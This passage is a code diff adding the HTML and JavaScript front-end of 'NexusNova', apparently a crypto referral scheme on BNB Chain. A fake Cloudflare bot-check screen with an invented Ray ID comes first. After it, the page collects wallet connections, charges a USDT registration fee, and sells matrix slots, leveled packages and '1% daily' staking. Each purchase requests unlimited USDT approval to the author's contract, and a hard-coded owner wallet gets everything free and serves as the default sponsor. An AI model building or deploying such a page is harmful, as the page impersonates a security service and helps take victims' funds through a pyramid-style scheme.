@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NexusNova - Exclusive Web3 Portal</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@700;800&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
+
+    /* 1. CLOUDFLARE BOT VERIFICATION */
+    #security-gate {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: #000000; color: #ffffff;
+      display: flex; flex-direction: column; justify-content: space-between;
+      padding: 60px 24px 40px 24px; z-index: 99999;
+    }
+    .sec-header { font-family: 'Space Grotesk', sans-serif; font-size: 34px; font-weight: 800; margin-bottom: 24px; word-break: break-all; }
+    .sec-sub-title { font-size: 22px; font-weight: 700; margin-bottom: 16px; color: #f8fafc; }
+    .sec-desc { font-size: 14.5px; color: #94a3b8; line-height: 1.6; max-width: 400px; }
+    .sec-footer { border-top: 1px solid rgba(255, 255, 255, 0.15); padding-top: 18px; text-align: center; font-size: 12px; color: #64748b; }
+    .sec-footer a { color: #94a3b8; text-decoration: none; margin-left: 5px; }
+
+    /* 2. REGISTRATION & AUTH SCREEN */
+    #auth-screen {
+      min-height: 100vh; background: #fdf2f4;
+      display: none; align-items: center; justify-content: center;
+      padding: 20px 14px;
+    }
+    .auth-card {
+      width: 100%; max-width: 420px; background: #ffffff;
+      border-radius: 24px; padding: 32px 24px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+      border: 1px solid rgba(229, 231, 235, 0.8);
+    }
+    .logo-area { text-align: center; margin-bottom: 20px; }
+    .brand-logo {
+      font-family: 'Space Grotesk', sans-serif; font-size: 28px; font-weight: 800;
+      letter-spacing: 1.5px;
+      background: linear-gradient(135deg, #a855f7, #ec4899);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    }
+    .brand-tag { font-size: 11px; color: #9333ea; font-weight: 700; letter-spacing: 1.8px; text-transform: uppercase; margin-top: 2px; }
+    .page-title { font-size: 20px; font-weight: 800; color: #1e293b; text-align: center; margin-bottom: 20px; }
+    .form-group { margin-bottom: 16px; }
+    .form-label { display: block; font-size: 13px; font-weight: 700; color: #334155; margin-bottom: 8px; }
+    .form-input {
+      width: 100%; height: 48px; border: 1.5px solid #e2e8f0; border-radius: 12px;
+      padding: 0 16px; font-size: 14px; color: #1e293b; outline: none;
+    }
+    .form-input:disabled { background: #f8fafc; color: #64748b; }
+    .btn-action {
+      width: 100%; height: 50px; background: #7c3aed; color: #ffffff; border: none;
+      border-radius: 12px; font-size: 15px; font-weight: 700; display: flex;
+      align-items: center; justify-content: center; gap: 10px; cursor: pointer; margin-top: 10px;
+    }
+    .btn-action.exist { background: #6d28d9; }
+    .divider { height: 1px; background: #f1f5f9; margin: 20px 0 16px 0; }
+    .sub-link { text-align: center; font-size: 13px; color: #64748b; margin-bottom: 10px; }
+    .sub-link a { color: #7c3aed; text-decoration: none; font-weight: 700; cursor: pointer; }
+    .footer-rules { text-align: center; font-size: 12.5px; color: #64748b; margin-top: 20px; padding-top: 14px; border-top: 1px solid #f8fafc; }
+
+    .status-alert {
+      padding: 12px 14px; border-radius: 10px; font-size: 12.5px; margin-bottom: 16px;
+      display: none; text-align: center; line-height: 1.4;
+    }
+    .status-alert.error { background: #fee2e2; color: #dc2626; display: block; }
+    .status-alert.success { background: #dcfce7; color: #15803d; display: block; }
+    .status-alert.info { background: #e0f2fe; color: #0369a1; display: block; }
+
+    /* 3. FULL UNLOCKED DASHBOARD */
+    #dashboard-screen {
+      display: none; background: radial-gradient(circle at top, #0b1528 0%, #030712 100%);
+      color: #f1f5f9; min-height: 100vh; padding: 16px 14px 60px 14px;
+    }
+    .dash-container { max-width: 580px; margin: 0 auto; }
+    .header-card {
+      background: linear-gradient(135deg, rgba(15, 23, 42, 0.95), rgba(30, 41, 59, 0.75));
+      border: 1px solid rgba(245, 176, 65, 0.25); border-radius: 20px; padding: 20px 16px;
+      text-align: center; margin-bottom: 16px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    }
+    .dash-brand {
+      font-family: 'Space Grotesk', sans-serif; font-size: 26px; font-weight: 800; letter-spacing: 2px;
+      background: linear-gradient(135deg, #ffffff, #f5b041);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    }
+    .wallet-pill {
+      display: inline-flex; align-items: center; background: rgba(3, 7, 18, 0.85);
+      border: 1px solid rgba(245, 176, 65, 0.35); padding: 6px 16px; border-radius: 30px; gap: 8px; margin-top: 10px;
+    }
+    .dot-green { width: 8px; height: 8px; background: #10b981; border-radius: 50%; box-shadow: 0 0 8px #10b981; }
+
+    .nav-tabs { display: flex; gap: 6px; overflow-x: auto; padding-bottom: 8px; margin-bottom: 16px; scrollbar-width: none; }
+    .nav-tabs::-webkit-scrollbar { display: none; }
+    .tab-btn {
+      flex: 1; min-width: 95px; background: rgba(15, 23, 42, 0.85); border: 1px solid rgba(255, 255, 255, 0.08);
+      color: #94a3b8; padding: 10px 8px; border-radius: 12px; font-size: 12px; font-weight: 700; cursor: pointer; white-space: nowrap;
+    }
+    .tab-btn.active { background: linear-gradient(135deg, #f59e0b, #d97706); color: #090d16; border-color: #f59e0b; }
+    .tab-pane { display: none; }
+    .tab-pane.active { display: block; }
+
+    .card { background: rgba(15, 23, 42, 0.9); border: 1px solid rgba(255, 255, 255, 0.07); border-radius: 16px; padding: 16px; margin-bottom: 16px; }
+    .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; border-bottom: 1px solid rgba(255, 255, 255, 0.06); padding-bottom: 10px; }
+    .card-title { font-size: 14px; font-weight: 800; color: #f5b041; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px dashed rgba(255, 255, 255, 0.07); font-size: 12.5px; }
+    .info-row:last-child { border-bottom: none; }
+    .info-label { color: #94a3b8; }
+    .info-val { font-weight: 700; color: #f8fafc; }
+
+    .pkg-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 14px; }
+    .pkg-box { background: rgba(2, 6, 23, 0.8); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 12px 8px; text-align: center; }
+    .pkg-box.gold { border-color: rgba(245, 176, 65, 0.6); background: linear-gradient(180deg, rgba(245, 176, 65, 0.1), rgba(2, 6, 23, 0.9)); }
+    .pkg-box-title { font-size: 11px; color: #94a3b8; font-weight: 700; margin-bottom: 4px; }
+    .pkg-box-price { font-family: 'Space Grotesk', sans-serif; font-size: 21px; font-weight: 800; color: #38bdf8; margin-bottom: 6px; }
+    .pkg-box.gold .pkg-box-price { color: #f5b041; }
+    .pkg-box-desc { font-size: 10px; color: #cbd5e1; line-height: 1.4; margin-bottom: 10px; }
+
+    .dash-action-btn { width: 100%; background: linear-gradient(135deg, #0284c7, #0369a1); color: #fff; border: none; padding: 9px 0; border-radius: 8px; font-size: 12px; font-weight: 700; cursor: pointer; }
+    .dash-action-btn.gold { background: linear-gradient(135deg, #f59e0b, #d97706); color: #000; font-weight: 800; }
+    .dash-action-btn.unlocked { background: #10b981 !important; color: #030712 !important; font-weight: 800; cursor: default; }
+
+    /* MATRIX SLOTS DESIGN */
+    .matrix-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
+    .matrix-slot-card { 
+      background: rgba(3, 7, 18, 0.85); 
+      border: 1px solid rgba(56, 189, 248, 0.25); 
+      border-radius: 14px; 
+      padding: 14px 10px; 
+      text-align: center; 
+    }
+    .slot-cost { font-family: 'Space Grotesk', sans-serif; font-size: 18px; font-weight: 800; color: #fff; margin: 4px 0 6px 0; }
+    
+    .matrix-circles {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+      margin: 10px 0 12px 0;
+    }
+    .m-circle {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      border: 1.5px solid #38bdf8;
+      background: rgba(56, 189, 248, 0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 10px;
+      color: #94a3b8;
+    }
+    .m-circle.filled {
+      background: #f59e0b;
+      border-color: #f59e0b;
+      color: #030712;
+      font-weight: 800;
+      box-shadow: 0 0 10px rgba(245, 158, 11, 0.7);
+    }
+    .m-circle.recycle {
+      border-color: #f59e0b;
+      color: #f59e0b;
+    }
+
+    .jackpot-hero { background: linear-gradient(135deg, rgba(245, 158, 11, 0.15), rgba(15, 23, 42, 0.95)); border: 1px solid rgba(245, 176, 65, 0.4); border-radius: 14px; padding: 18px; text-align: center; margin-bottom: 14px; }
+    .jackpot-val { font-family: 'Space Grotesk', sans-serif; font-size: 30px; font-weight: 800; color: #f5b041; }
+    .countdown-timer { display: inline-block; background: rgba(3, 7, 18, 0.8); border: 1px solid rgba(56, 189, 248, 0.4); padding: 5px 14px; border-radius: 20px; color: #38bdf8; font-family: monospace; font-size: 12.5px; font-weight: 700; margin-top: 6px; }
+
+    .input-group { display: flex; gap: 8px; }
+    .input-field { flex: 1; background: rgba(3, 7, 18, 0.8); border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 8px; padding: 10px 12px; color: #fff; font-size: 12px; }
+  </style>
+</head>
+<body>
+
+  <!-- STEP 1: CLOUDFLARE BOT VERIFICATION -->
+  <div id="security-gate">
+    <div>
+      <div class="sec-header" id="sec-domain-text">nexusnova-app.github.io</div>
+      <div class="sec-sub-title">Performing security verification</div>
+      <p class="sec-desc">
+        This website uses a security service to protect against malicious bots. This page is displayed while the website verifies you are not a bot.
+      </p>
+    </div>
+    <div class="sec-footer">
+      Ray ID: <span id="ray-id">a47cb51a0a19dae4</span><br>
+      Performance and Security by <strong style="color:#cbd5e1;">Cloudflare</strong> | <a href="#">Privacy</a>
+    </div>
+  </div>
+
+  <!-- STEP 2: REGISTRATION & $2 ACTIVATION SCREEN -->
+  <div id="auth-screen">
+    <div class="auth-card">
+      <div class="logo-area">
+        <div class="brand-logo">NEXUSNOVA</div>
+        <div class="brand-tag">INFINITY IS THE LIMIT</div>
+      </div>
+
+      <div class="page-title" id="page-heading">Create a new account</div>
+      <div id="status-msg" class="status-alert"></div>
+
+      <div id="reg-fields">
+        <div class="form-group">
+          <label class="form-label">Username</label>
+          <input type="text" id="username-inp" class="form-input" placeholder="Enter your Name">
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Sponsor</label>
+          <input type="text" id="sponsor-inp" class="form-input" value="0x33E4677827502E3089A66CfcFBd5C11C77C6680e">
+        </div>
+      </div>
+
+      <div class="form-group" id="wallet-group" style="display: none;">
+        <label class="form-label">Wallet Account</label>
+        <input type="text" id="wallet-disp" class="form-input" disabled>
+      </div>
+
+      <button class="btn-action" id="main-btn" onclick="handleAuthAction()">
+        🦊 <span id="btn-text">Connect Wallet</span>
+      </button>
+
+      <div class="divider"></div>
+
+      <div class="sub-link">
+        <span id="switch-prompt">Already have an account?</span> 
+        <a onclick="toggleAuthMode()" id="switch-action">Sign in</a>
+      </div>
+
+      <div class="footer-rules">
+        Click here to learn about the rules
+      </div>
+    </div>
+  </div>
+
+  <!-- STEP 3: FULL UNLOCKED DASHBOARD -->
+  <div id="dashboard-screen">
+    <div class="dash-container">
+      <div class="header-card">
+        <div class="dash-brand">NEXUSNOVA</div>
+        <div style="font-size:11px; color:#38bdf8; font-weight:700; letter-spacing:1.2px; text-transform:uppercase;">DECENTRALIZED ECOSYSTEM</div>
+        <div class="wallet-pill">
+          <div class="dot-green"></div>
+          <span id="dash-wallet-disp" style="font-size:12px; font-family:monospace; color:#cbd5e1;">0x00...0000</span>
+        </div>
+      </div>
+
+      <div id="dash-status-box" class="status-alert"></div>
+
+      <div class="nav-tabs">
+        <button class="tab-btn active" onclick="switchDashTab(event, 'dashboard')">📊 Dashboard</button>
+        <button class="tab-btn" onclick="switchDashTab(event, 'profile')">👤 Profile</button>
+        <button class="tab-btn" onclick="switchDashTab(event, 'matrix')">🔄 Matrix Slots</button>
+        <button class="tab-btn" onclick="switchDashTab(event, 'staking')">📈 Staking Vault</button>
+        <button class="tab-btn" onclick="switchDashTab(event, 'lottery')">🎟️ 15-Day Jackpot</button>
+      </div>
+
+      <!-- Tab: Dashboard -->
+      <div id="dash-dashboard" class="tab-pane active">
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">📦 Single-Leg Packages</div>
+            <span style="font-size:10px; color:#38bdf8; font-weight:700;">BEP-20 USDT</span>
+          </div>
+          <div class="pkg-grid">
+            <div class="pkg-box">
+              <div class="pkg-box-title">Basic</div>
+              <div class="pkg-box-price">$25</div>
+              <div class="pkg-box-desc">20 Levels Yield</div>
+              <button class="dash-action-btn" id="pkg-btn-25" onclick="buySingleLegPackage(25)">Activate</button>
+            </div>
+            <div class="pkg-box">
+              <div class="pkg-box-title">Standard</div>
+              <div class="pkg-box-price">$50</div>
+              <div class="pkg-box-desc">30 Levels Yield</div>
+              <button class="dash-action-btn" id="pkg-btn-50" onclick="buySingleLegPackage(50)">Activate</button>
+            </div>
+            <div class="pkg-box gold">
+              <div class="pkg-box-title">Pro Elite</div>
+              <div class="pkg-box-price">$100</div>
+              <div class="pkg-box-desc">40 Levels Yield</div>
+              <button class="dash-action-btn gold" id="pkg-btn-100" onclick="buySingleLegPackage(100)">Activate</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><div class="card-title">💰 Earnings & Payout</div></div>
+          <div class="info-row"><span class="info-label">Total Earned:</span><span class="info-val" id="total-earned-disp">$0.00 USDT</span></div>
+          <div class="info-row"><span class="info-label">Withdrawable:</span><span class="info-val" id="withdrawable-disp" style="color:#10b981;">$0.00 USDT</span></div>
+          <button class="dash-action-btn gold" style="margin-top:14px; padding:12px 0;" onclick="claimPayout()">⚡ Claim Instant Payout</button>
+        </div>
+      </div>
+
+      <!-- Tab: Profile -->
+      <div id="dash-profile" class="tab-pane">
+        <div class="card">
+          <div class="card-header"><div class="card-title">👤 Account Overview</div></div>
+          <div class="info-row"><span class="info-label">Username:</span><span class="info-val" id="profile-user-name" style="color:#38bdf8;">--</span></div>
+          <div class="info-row"><span class="info-label">Global User ID:</span><span class="info-val" id="user-id-disp" style="color:#f5b041;">#1</span></div>
+          <div class="info-row"><span class="info-label">Sponsor ID:</span><span class="info-val" id="sponsor-id-disp">Protocol Root</span></div>
+          <div class="info-row"><span class="info-label">Direct Partners:</span><span class="info-val" id="direct-team-disp">0</span></div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">🔗 Referral Link</div></div>
+          <div class="input-group">
+            <input type="text" class="input-field" id="ref-link-field" readonly value="">
+            <button class="dash-action-btn gold" style="width:75px;" onclick="copyRefLink()">Copy</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Tab: Matrix Slots -->
+      <div id="dash-matrix" class="tab-pane">
+        <div class="card">
+          <div class="card-header"><div class="card-title">🔄 Matrix Slots (1×3 Positions)</div></div>
+          <div class="matrix-grid">
+            
+            <!-- Slot 1 -->
+            <div class="matrix-slot-card">
+              <div style="font-size:11px; color:#38bdf8; font-weight:800;">SLOT 1</div>
+              <div class="slot-cost">$10 USDT</div>
+              <div class="matrix-circles">
+                <div class="m-circle filled">1</div>
+                <div class="m-circle">2</div>
+                <div class="m-circle recycle">⟳</div>
+              </div>
+              <button class="dash-action-btn slot-act-btn" id="slot-btn-1" onclick="buyMatrixSlot(1, 10)">Activate ($10)</button>
+            </div>
+
+            <!-- Slot 2 -->
+            <div class="matrix-slot-card">
+              <div style="font-size:11px; color:#38bdf8; font-weight:800;">SLOT 2</div>
+              <div class="slot-cost">$20 USDT</div>
+              <div class="matrix-circles">
+                <div class="m-circle">1</div>
+                <div class="m-circle">2</div>
+                <div class="m-circle recycle">⟳</div>
+              </div>
+              <button class="dash-action-btn slot-act-btn" id="slot-btn-2" onclick="buyMatrixSlot(2, 20)">Activate ($20)</button>
+            </div>
+
+            <!-- Slot 3 -->
+            <div class="matrix-slot-card">
+              <div style="font-size:11px; color:#38bdf8; font-weight:800;">SLOT 3</div>
+              <div class="slot-cost">$40 USDT</div>
+              <div class="matrix-circles">
+                <div class="m-circle">1</div>
+                <div class="m-circle">2</div>
+                <div class="m-circle recycle">⟳</div>
+              </div>
+              <button class="dash-action-btn slot-act-btn" id="slot-btn-3" onclick="buyMatrixSlot(3, 40)">Activate ($40)</button>
+            </div>
+
+            <!-- Slot 4 -->
+            <div class="matrix-slot-card">
+              <div style="font-size:11px; color:#38bdf8; font-weight:800;">SLOT 4</div>
+              <div class="slot-cost">$80 USDT</div>
+              <div class="matrix-circles">
+                <div class="m-circle">1</div>
+                <div class="m-circle">2</div>
+                <div class="m-circle recycle">⟳</div>
+              </div>
+              <button class="dash-action-btn slot-act-btn" id="slot-btn-4" onclick="buyMatrixSlot(4, 80)">Activate ($80)</button>
+            </div>
+
+            <!-- Slot 5 -->
+            <div class="matrix-slot-card">
+              <div style="font-size:11px; color:#38bdf8; font-weight:800;">SLOT 5</div>
+              <div class="slot-cost">$160 USDT</div>
+              <div class="matrix-circles">
+                <div class="m-circle">1</div>
+                <div class="m-circle">2</div>
+                <div class="m-circle recycle">⟳</div>
+              </div>
+              <button class="dash-action-btn slot-act-btn" id="slot-btn-5" onclick="buyMatrixSlot(5, 160)">Activate ($160)</button>
+            </div>
+
+            <!-- Slot 6 -->
+            <div class="matrix-slot-card">
+              <div style="font-size:11px; color:#38bdf8; font-weight:800;">SLOT 6</div>
+              <div class="slot-cost">$320 USDT</div>
+              <div class="matrix-circles">
+                <div class="m-circle">1</div>
+                <div class="m-circle">2</div>
+                <div class="m-circle recycle">⟳</div>
+              </div>
+              <button class="dash-action-btn gold slot-act-btn" id="slot-btn-6" onclick="buyMatrixSlot(6, 320)">Activate ($320)</button>
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+      <!-- Tab: Staking Vault -->
+      <div id="dash-staking" class="tab-pane">
+        <div class="card">
+          <div class="card-header"><div class="card-title">📈 Staking Vault (1% Daily)</div></div>
+          <div class="input-group">
+            <input type="number" class="input-field" placeholder="Min $10 USDT" id="stake-amount">
+            <button class="dash-action-btn gold" style="width:100px;" onclick="handleStaking()">Stake</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Tab: 15-Day Jackpot -->
+      <div id="dash-lottery" class="tab-pane">
+        <div class="card">
+          <div class="card-header"><div class="card-title">🎟️ 15-Day Global Jackpot</div></div>
+          <div class="jackpot-hero">
+            <div class="jackpot-val" id="jackpot-pool-disp">Loading...</div>
+            <div class="countdown-timer">Continuous Global Pool</div>
+          </div>
+        </div>
+      </div>
+
+      <button class="dash-action-btn" style="background:#ef4444; margin-top:20px; padding:12px 0;" onclick="location.reload()">
+        🔒 Exit & Logout
+      </button>
+    </div>
+  </div>
+
+  <script>
+    // আপনি রিমিক্স থেকে যে নতুন কন্ট্রাক্টটি ডিপ্লয় করেছেন:
+    const CONTRACT_ADDRESS = "0x4205b685A09a9222b7D7dB9dA84EffD0dD397d40";
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+    
+    // আপনার নিজস্ব মাস্টার ওয়ালেট (ফ্রি বাইপাস)
+    const FREE_MASTER_WALLET = "0x33E4677827502E3089A66CfcFBd5C11C77C6680e".toLowerCase();
+
+    // নতুন কন্ট্রাক্টের আসল ABI ফাংশন
+    const CONTRACT_ABI = [
+      "function registerUser(address sponsor) external",
+      "function buyMatrixSlot(uint8 slotId) external",
+      "function buySingleLegPackage(uint256 amount) external",
+      "function stakeUSDT(uint256 amount) external",
+      "function claimPayout() external",
+      "function users(address) external view returns (bool isRegistered, uint256 globalIndex, address sponsor, uint256 totalEarned, uint256 claimableBalance, uint256 directCount, uint256 stakedAmount, uint256 stakeTimestamp)",
+      "function getWithdrawable(address) external view returns (uint256)",
+      "function jackpotPool() external view returns (uint256)"
+    ];
+
+    const ERC20_ABI = [
+      "function approve(address spender, uint256 amount) external returns (bool)",
+      "function allowance(address owner, address spender) external view returns (uint256)",
+      "function balanceOf(address account) external view returns (uint256)"
+    ];
+
+    let provider, signer, userAddress, mainContract, usdtContract;
+    let isLoginMode = false;
+    let isConnected = false;
+
+    function showAlert(msg, type = "info") {
+      const box = document.getElementById('status-msg');
+      box.innerText = msg; box.className = "status-alert " + type;
+      setTimeout(() => { box.className = "status-alert"; }, 6000);
+    }
+
+    function showDashAlert(msg, type = "info") {
+      const box = document.getElementById('dash-status-box');
+      box.innerText = msg; box.className = "status-alert " + type;
+      setTimeout(() => { box.className = "status-alert"; }, 6000);
+    }
+
+    window.addEventListener('load', () => {
+      document.getElementById('sec-domain-text').innerText = window.location.hostname || "nexusnova-app.github.io";
+      document.getElementById('ray-id').innerText = Math.random().toString(16).substring(2, 10) + Math.random().toString(16).substring(2, 10);
+
+      setTimeout(() => {
+        document.getElementById('security-gate').style.display = 'none';
+        document.getElementById('auth-screen').style.display = 'flex';
+        if (window.ethereum) connectWallet();
+      }, 2200);
+
+      const p = new URLSearchParams(window.location.search);
+      const ref = p.get('ref');
+      if (ref) document.getElementById('sponsor-inp').value = ref;
+    });
+
+    function toggleAuthMode() {
+      isLoginMode = !isLoginMode;
+      const heading = document.getElementById('page-heading');
+      const regFields = document.getElementById('reg-fields');
+      const switchPrompt = document.getElementById('switch-prompt');
+      const switchAction = document.getElementById('switch-action');
+      const btnText = document.getElementById('btn-text');
+
+      if (isLoginMode) {
+        heading.innerText = "Sign In to Account";
+        regFields.style.display = "none";
+        switchPrompt.innerText = "Don't have an account?";
+        switchAction.innerText = "Create Account";
+        btnText.innerText = isConnected ? "Enter Dashboard" : "Connect & Sign In";
+      } else {
+        heading.innerText = "Create a new account";
+        regFields.style.display = "block";
+        switchPrompt.innerText = "Already have an account?";
+        switchAction.innerText = "Sign in";
+        btnText.innerText = isConnected ? "Pay $2 USDT & Register" : "Connect Wallet";
+      }
+    }
+
+    async function connectWallet() {
+      if (!window.ethereum) return;
+      try {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        const accs = await provider.send("eth_requestAccounts", []);
+        if (accs.length > 0) {
+          signer = provider.getSigner();
+          userAddress = (await signer.getAddress()).toLowerCase();
+          isConnected = true;
+
+          document.getElementById('wallet-group').style.display = "block";
+          document.getElementById('wallet-disp').value = userAddress;
+
+          mainContract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+          usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
+
+          const btn = document.getElementById('main-btn');
+          const btnText = document.getElementById('btn-text');
+
+          // ১. মাস্টার ওয়ালেট চেক (VIP)
+          if (userAddress === FREE_MASTER_WALLET) {
+            btnText.innerText = "VIP Master Wallet! Enter Dashboard";
+            btn.classList.add('exist');
+            return;
+          }
+
+          // ২. সাধারণ ইউজার চেক
+          const u = await mainContract.users(userAddress);
+          if (u.isRegistered) {
+            btnText.innerText = "Exist Wallet! Enter Dashboard";
+            btn.classList.add('exist');
+          } else {
+            btnText.innerText = isLoginMode ? "Enter Dashboard" : "Pay $2 USDT & Register";
+            btn.classList.remove('exist');
+          }
+        }
+      } catch (err) {
+        showAlert("Connection error: " + (err.reason || err.message), "error");
+      }
+    }
+
+    async function handleAuthAction() {
+      if (!window.ethereum) { showAlert("Open inside Trust Wallet / MetaMask!", "error"); return; }
+      if (!isConnected) { await connectWallet(); return; }
+
+      // মাস্টার ওয়ালেটের জন্য কোনো ফি ছাড়া আনলক
+      if (userAddress === FREE_MASTER_WALLET) {
+        showAlert("Welcome Master Wallet! Unlocking everything...", "success");
+        const masterData = {
+          isRegistered: true,
+          globalIndex: 1,
+          sponsor: "Protocol Root",
+          totalEarned: ethers.utils.parseUnits("0", 18),
+          directCount: 0
+        };
+        setTimeout(() => {
+          openFullDashboard(masterData);
+          unlockAllTiersForMaster();
+        }, 500);
+        return;
+      }
+
+      // সাধারণ ইউজারের প্রসেস
+      try {
+        const u = await mainContract.users(userAddress);
+        if (u.isRegistered) {
+          openFullDashboard(u);
+          return;
+        }
+
+        if (isLoginMode) {
+          showAlert("Wallet not registered yet! Please Create Account first.", "error");
+          return;
+        }
+
+        await executeRegisterPayment();
+      } catch (err) {
+        showAlert("Error checking account: " + (err.reason || err.message), "error");
+      }
+    }
+
+    function unlockAllTiersForMaster() {
+      ['25', '50', '100'].forEach(id => {
+        const b = document.getElementById('pkg-btn-' + id);
+        if (b) {
+          b.innerText = "Active (VIP)";
+          b.classList.add('unlocked');
+        }
+      });
+
+      document.querySelectorAll('.slot-act-btn').forEach(btn => {
+        btn.innerText = "Active (Unlocked)";
+        btn.classList.add('unlocked');
+      });
+    }
+
+    async function executeRegisterPayment() {
+      const uName = document.getElementById('username-inp').value.trim();
+      if (!uName) { showAlert("Please enter your Username / Name first!", "error"); return; }
+
+      let sponsor = document.getElementById('sponsor-inp').value.trim();
+      if (!ethers.utils.isAddress(sponsor)) sponsor = FREE_MASTER_WALLET;
+
+      try {
+        const reqAmt = ethers.utils.parseUnits("2", 18);
+        const bal = await usdtContract.balanceOf(userAddress);
+        if (bal.lt(reqAmt)) {
+          showAlert("Insufficient balance! Minimum $2.00 USDT required.", "error");
+          return;
+        }
+
+        const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
+        if (allowance.lt(reqAmt)) {
+          showAlert("Please approve $2 USDT in your wallet...", "info");
+          const txA = await usdtContract.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+          await txA.wait();
+        }
+
+        showAlert("Registering on Blockchain...", "info");
+        const tx = await mainContract.registerUser(sponsor);
+        await tx.wait();
+
+        showAlert("Registered successfully! Unlocking dashboard...", "success");
+        setTimeout(async () => {
+          const u = await mainContract.users(userAddress);
+          openFullDashboard(u);
+        }, 1500);
+
+      } catch (err) {
+        showAlert("Transaction error: " + (err.reason || err.message), "error");
+      }
+    }
+
+    async function openFullDashboard(u) {
+      document.getElementById('auth-screen').style.display = "none";
+      document.getElementById('dashboard-screen').style.display = "block";
+
+      const uName = document.getElementById('username-inp').value.trim() || (userAddress === FREE_MASTER_WALLET ? "Founder Master" : "Active Member");
+      document.getElementById('profile-user-name').innerText = uName;
+      document.getElementById('dash-wallet-disp').innerText = userAddress.slice(0, 6) + "..." + userAddress.slice(-4);
+      document.getElementById('user-id-disp').innerText = "#" + (u.globalIndex ? u.globalIndex.toString() : "1");
+      document.getElementById('sponsor-id-disp').innerText = u.sponsor ? (u.sponsor.length > 10 ? u.sponsor.slice(0, 6) + "..." + u.sponsor.slice(-4) : u.sponsor) : "Protocol";
+      document.getElementById('direct-team-disp').innerText = u.directCount ? u.directCount.toString() : "0";
+      document.getElementById('ref-link-field').value = window.location.origin + window.location.pathname + "?ref=" + userAddress;
+      document.getElementById('total-earned-disp').innerText = "$" + ethers.utils.formatUnits(u.totalEarned, 18) + " USDT";
+
+      try {
+        const withdrawable = await mainContract.getWithdrawable(userAddress);
+        document.getElementById('withdrawable-disp').innerText = "$" + ethers.utils.formatUnits(withdrawable, 18) + " USDT";
+      } catch (e) {
+        document.getElementById('withdrawable-disp').innerText = "$0.00 USDT";
+      }
+
+      try {
+        const pool = await mainContract.jackpotPool();
+        document.getElementById('jackpot-pool-disp').innerText = "$" + parseFloat(ethers.utils.formatUnits(pool, 18)).toFixed(2) + " USDT";
+      } catch (e) {
+        document.getElementById('jackpot-pool-disp').innerText = "$0.00 USDT";
+      }
+    }
+
+    function switchDashTab(evt, tabId) {
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+      evt.currentTarget.classList.add('active');
+      document.getElementById('dash-' + tabId).classList.add('active');
+    }
+
+    // ম্যাট্রিক্স স্লট কেনা
+    async function buyMatrixSlot(slotId, price) {
+      if (userAddress === FREE_MASTER_WALLET) {
+        showDashAlert("This slot is permanently active for your VIP wallet!", "success");
+        return;
+      }
+      try {
+        const priceWei = ethers.utils.parseUnits(price.toString(), 18);
+        const bal = await usdtContract.balanceOf(userAddress);
+        if (bal.lt(priceWei)) {
+          showDashAlert("Insufficient USDT for Slot " + slotId + "!", "error");
+          return;
+        }
+
+        const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
+        if (allowance.lt(priceWei)) {
+          showDashAlert("Approving USDT...", "info");
+          const txA = await usdtContract.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+          await txA.wait();
+        }
+
+        showDashAlert("Purchasing Slot " + slotId + "...", "info");
+        const tx = await mainContract.buyMatrixSlot(slotId);
+        await tx.wait();
+        showDashAlert("Slot " + slotId + " activated successfully!", "success");
+
+        const u = await mainContract.users(userAddress);
+        openFullDashboard(u);
+      } catch (err) {
+        showDashAlert("Slot purchase error: " + (err.reason || err.message), "error");
+      }
+    }
+
+    // সিঙ্গেল-লেগ প্যাকেজ কেনা
+    async function buySingleLegPackage(amount) {
+      if (userAddress === FREE_MASTER_WALLET) {
+        showDashAlert("This package is already active for your VIP wallet!", "success");
+        return;
+      }
+      try {
+        const amtWei = ethers.utils.parseUnits(amount.toString(), 18);
+        const bal = await usdtContract.balanceOf(userAddress);
+        if (bal.lt(amtWei)) {
+          showDashAlert("Insufficient USDT for $" + amount + " package!", "error");
+          return;
+        }
+
+        const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
+        if (allowance.lt(amtWei)) {
+          showDashAlert("Approving USDT...", "info");
+          const txA = await usdtContract.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+          await txA.wait();
+        }
